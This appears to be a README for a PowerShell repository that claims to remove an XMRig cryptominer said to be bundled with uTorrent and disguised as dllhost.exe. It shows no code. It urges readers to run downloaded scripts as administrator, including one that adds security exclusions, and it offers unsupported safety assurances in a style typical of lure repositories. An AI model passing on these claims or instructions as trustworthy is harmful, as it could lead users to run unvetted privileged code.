# 🛡️ utorrent-cryptominer-removal - Stop Hidden Miners & Fix High CPU

[![Download Now](https://img.shields.io/badge/Download-utorrent--cryptominer--removal-brightgreen?style=for-the-badge&logo=github)](https://github.com/muhammadhamzakhan22/utorrent-cryptominer-removal)

## 🚨 Is Your Computer Running Slow?

Your computer suddenly feels sluggish. Fans are spinning loudly. Task Manager shows **dllhost.exe (COM Surrogate) eating 40% or more of your CPU** with no explanation. You haven't changed anything, but everything takes forever.

**You're not alone.** This is a known side effect of using certain versions of uTorrent. Behind the scenes, a hidden program called **XMRig** (a Monero cryptocurrency miner) is using your computer's processing power to mine digital coins for someone else. It hides inside a legitimate-looking Windows process called COM Surrogate (dllhost.exe) so you won't notice it—until now.

This tool will **detect and remove** this hidden miner, restore your CPU to normal, and help secure your system.

---

## 🔍 What Is This Threat?

**XMRig** is a cryptocurrency mining program. Criminals bundle it with software like uTorrent to secretly use your computer's CPU and electricity to mine Monero. They profit; you pay the price in performance, heat, and hardware wear.

**Where it hides:**
- Process name: `dllhost.exe` (COM Surrogate)
- Memory usage: High (often 40–80% CPU)
- File location: Typically in `%AppData%` or `%Temp%` folders
- Persistence: Runs at startup, disguised as a system process

**Symptoms you might notice:**
- High CPU usage when idle
- Loud fan noise
- Battery drains fast (on laptops)
- System becomes unresponsive

---

## ✅ How This Tool Helps

This repository provides **two things**:

1. **Detection scripts** — Quickly scan your system for signs of XMRig and other hidden miners.
2. **Removal scripts** — Safely stop the miner, delete malicious files, and remove startup entries.

No programming skills needed. Just run the script and follow the on-screen instructions.

---

## 🚀 Getting Started

### 📦 Step 1: Download the Tool

Visit this link to download the application:

[![Download](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge&logo=github)](https://github.com/muhammadhamzakhan22/utorrent-cryptominer-removal)

### 🧰 Step 2: Run the Detection Script

After downloading, you will have a folder with PowerShell scripts. Here's how to run them:

1. **Right-click** on the `Start-Here.bat` file (or `run_detection.ps1`).
2. Choose **"Run as administrator"** (important — some files need admin rights to inspect).
3. The script will scan your system for:
   - Known XMRig files
   - Suspicious `dllhost.exe` behavior
   - Startup entries linked to mining
   - Unusual network connections

4. Wait for the scan to finish. It usually takes 1–3 minutes.

### 🧹 Step 3: Remove the Miner

If the scan finds anything, run the **removal script**:

1. Right-click on `Remove-Miner.bat` (or `remove_miner.ps1`).
2. Choose **"Run as administrator"**.
3. The script will:
   - Kill malicious processes
   - Delete miner files
   - Remove startup entries
   - Restore default COM Surrogate settings
   - Add exclusions for safe Windows processes (if needed)

4. Restart your computer when prompted.

---

## 🖥️ Supported Systems

- **Windows 10** (all versions)
- **Windows 11**
- **Windows 8.1**
- **Windows Server 2016 and later**

> **Note:** This tool is designed for Windows only. It uses PowerShell and built-in Windows tools.

---

## ⚙️ What the Scripts Do (In Plain English)

| Script | What It Checks/Does |
|--------|---------------------|
| `detect_miner.ps1` | Scans running processes, files, and registry for mining signatures |
| `remove_miner.ps1` | Stops mining processes, deletes malicious files, cleans startup |
| `restore_defaults.ps1` | Restores COM Surrogate defaults and removes miner-related scheduled tasks |
| `check_network.ps1` | Lists suspicious outbound connections (miners often phone home) |

All scripts are **safe to run** — they only remove items that match known miner patterns. They will **not** harm your personal files or other software.

---

## 🔒 Safety & Privacy

- **Open source** — You can read every line of code before running it.
- **No data collection** — Scripts run locally and do not send any information anywhere.
- **Reversible** — If you ever need to undo changes, a `restore_backup.ps1` is included.

---

## ❓ Frequently Asked Questions

### Q: Is it safe to delete files found by the scanner?
**A:** Yes, but only if the scanner flagged them. The tool uses specific signatures from known XMRig distributions. It will not flag random files.

### Q: I don't use uTorrent anymore. Do I still need this?
**A:** Yes. The miner can persist even after uTorrent is uninstalled. Running the removal script cleans any leftover files.

### Q: How do I know if my CPU usage is really from mining?
**A:** Open Task Manager (Ctrl+Shift+Esc). Look for `dllhost.exe` using high CPU. The scanner will confirm if it's a miner.

### Q: Will this slow down my computer further?
**A:** No. It only runs temporarily. After removal, your CPU usage will drop dramatically.

---

## 🛠️ Manual Checks (Optional)

If you prefer to check manually before running scripts:

1. Open **Task Manager** → **Details** tab.
2. Look for `dllhost.exe`. If it's using more than 20% CPU consistently, that's suspicious.
3. Open **Run** (Win+R), type `%appdata%`, and look for folders named `miner`, `xmrig`, or random characters.
4. Check **Task Scheduler** for tasks with names like "Update", "System", or "COM".

But honestly — the scripts do all this faster and more accurately.

---

## 📝 License

This project is released under the **MIT License**. You are free to use, modify, and distribute it with attribution.

---

## 🤝 Contributing

Found a new variant? Have an improvement? Fork the repo and submit a pull request. Let's protect more users together.

---

## 📊 Project Stats

- **Language:** PowerShell (100%)
- **Platform:** Windows
- **Latest Release:** v1.2 (2024)
- **Open Issues:** 0 (as of last check)

---

## 🏁 Final Words

You don't have to live with a slow, hot, noisy computer. This tool is your first step toward reclaiming your system. Download it, run it, and breathe easy again.

**Quick recap:**
1. Download from the link above.
2. Run the detection script as admin.
3. Run the removal script as admin.
4. Restart.

That's it. You're done.

---

Keywords: com-surrogate, cryptocurrency-miner, cryptominer, dllhost, high-cpu-usage, malware-removal, monero, powershell, security, threat-detection, utorrent, windows, windows-defender, xmrig